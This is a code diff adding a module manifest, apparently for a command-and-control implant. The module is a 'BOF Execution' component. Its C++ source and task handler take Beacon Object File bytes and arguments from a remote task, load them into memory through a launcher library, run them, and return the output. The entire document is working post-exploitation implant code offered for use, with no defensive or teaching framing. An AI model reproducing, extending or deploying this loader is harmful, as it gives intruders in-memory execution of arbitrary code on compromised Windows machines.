@@ -1,0 +1,40 @@
+{
+  "module": {
+    "name": "bof",
+    "display_name": "BOF Execution",
+    "description": "Beacon Object File loader and executor",
+    "category": "execution",
+    "removable": true
+  },
+  "sources": {
+    "files": [
+      "bof.cpp",
+      "bof.h"
+    ],
+    "libs": [
+      "libs/bof_launcher_win_x64.lib"
+    ],
+    "headers": [
+      "libs/bof_launcher_api.h"
+    ]
+  },
+  "commands": {
+    "bof": {
+      "handler": "run_bof",
+      "args": [
+        "bof_contents",
+        "bof_args"
+      ],
+      "snippet": "    else if (task_name == \"bof\") {\n        nlohmann::json result;\n\n        auto& args = task_data[\"task\"][\"args\"];\n        if (!args.contains(\"bof_contents\") || !args.contains(\"bof_args\")) {\n            result[\"error\"] = \"Missing bof_contents or bof_args\";\n            return result;\n        }\n\n        std::string bof_args = args[\"bof_args\"];\n        std::vector<uint8_t> bof_bytes = determine_if_argument_is_data_or_memstore_pointer(args[\"bof_contents\"]);\n\n        if (bof_bytes.empty()) {\n            result[\"error\"] = \"bof content was empty (or invalid pointer)\";\n            return result;\n        }\n\n        ModuleResult module_result = run_bof(bof_bytes, bof_args);\n\n        result[\"windows_error_code\"] = module_result.windows_error_code;\n        result[\"message\"] = GetErrorMessage(module_result.windows_error_code);\n        result[\"data\"] = module_result.data;\n        return result;\n    }"
+    }
+  },
+  "dependencies": {
+    "link_libs": [
+      "bof_launcher_win_x64"
+    ]
+  },
+  "files": {
+    "bof.cpp": "extern \"C\" {\n    #include \"libs/bof_launcher_api.h\"\n}\n#include \"data/structs.h\"\n#include <vector>\n#include <windows.h>\n#include \"_debug/debug.h\"\n\nModuleResult run_bof(std::vector<uint8_t> bof_bytes, const std::string& bof_args) {\n\n    if (bofLauncherInit() < 0) {\n        return { \"\", ERROR_INTERNAL_ERROR };\n    }\n\n    BofObjectHandle bof_handle;\n    if (bofObjectInitFromMemory(bof_bytes.data(), bof_bytes.size(), &bof_handle) < 0) {\n        return { \"\", ERROR_BAD_FORMAT };\n    }\n\n    BofArgs* args0 = NULL;\n    if (bofArgsInit(&args0) < 0) {\n        DEBUG_LOG(\"Bof args err\");\n        return { \"\", ERROR_OUTOFMEMORY };\n    }\n    bofArgsBegin(args0);\n    bofArgsAdd(args0, (unsigned char*)bof_args.c_str(), bof_args.size());\n    bofArgsEnd(args0);\n\n    BofContext* context = NULL;\n    if (bofObjectRun(bof_handle, (unsigned char*)bofArgsGetBuffer(args0), bofArgsGetBufferSize(args0), &context) < 0) {\n        return { \"\", ERROR_INTERNAL_ERROR };\n    }\n\n    std::string bof_str_output{};\n    DWORD status{};\n    const char* output = bofContextGetOutput(context, NULL);\n    if (output) {\n        bof_str_output = std::string(output);\n        status = ERROR_SUCCESS;\n    }\n    else {\n        bof_str_output = \"\";\n        status = ERROR_UNIDENTIFIED_ERROR;\n    }\n\n    bofArgsRelease(args0);\n    bofContextRelease(context);\n\n    return { bof_str_output, status };\n}",
+    "bof.h": "#pragma once\n#include \"data/structs.h\"\nextern \"C\" {\n\t#include \"libs/bof_launcher_api.h\"\n}\n\n#include <vector>\n#include \"_debug/debug.h\"\n\nModuleResult run_bof(std::vector<uint8_t> bof_bytes, const std::string& bof_args);"
+  }
+}
